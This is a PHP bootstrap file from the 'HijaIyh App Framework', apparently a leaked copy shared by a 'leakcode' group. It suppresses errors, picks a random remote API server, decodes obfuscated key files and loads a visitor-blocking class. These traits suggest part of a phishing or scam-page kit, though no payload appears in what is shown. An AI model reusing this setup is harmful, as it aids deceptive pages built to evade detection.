<?php 
/*
    ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
    ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
    ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
    ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
    .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
    FuCked By [!]DNThirTeen
    https://www.facebook.com/groups/leakcode/
*/
/** 
* HijaIyh App Framework
* @author justalinko
* @version 2.1
**/

error_reporting(0);
@ini_set('display_errors',0);

$active_group = 'default';

$server['local'] = ['http://localhost/hijaiyh'];

$server['default'] = [
			'http://utama-server.hijaiyh.jp',
			'http://jaka-server.hijaiyh.jp',
			'http://justalinko-server.hijaiyh.jp'
					];

shuffle($server[$active_group]);
$API_URL = $server[$active_group][0];

@session_start();
set_time_limit(0);




spl_autoload_register(function($class)
{
	require_once(__DIR__.'/HijaIyh_App/class/'.$class.'.iyh.php');
});
 
$core = new hicore;
$iki = new Iki64;
/** account & api key */
@$kiakun = $iki->decodefile(__DIR__.'/HijaIyh_App/config/.account_key','HijaIyh_App');
@$kiapi = $iki->decodefile(__DIR__.'/HijaIyh_App/config/.api_key','HijaIyh_App');

/** --- */
$api = new hiapi(/*$API_URL,$kiakun,$kiapi*/);
$locales = new hilocale;
$blocker = new hiblocker;

/** check */
require_once(__DIR__.'/HijaIyh_App/AppCheck.php');
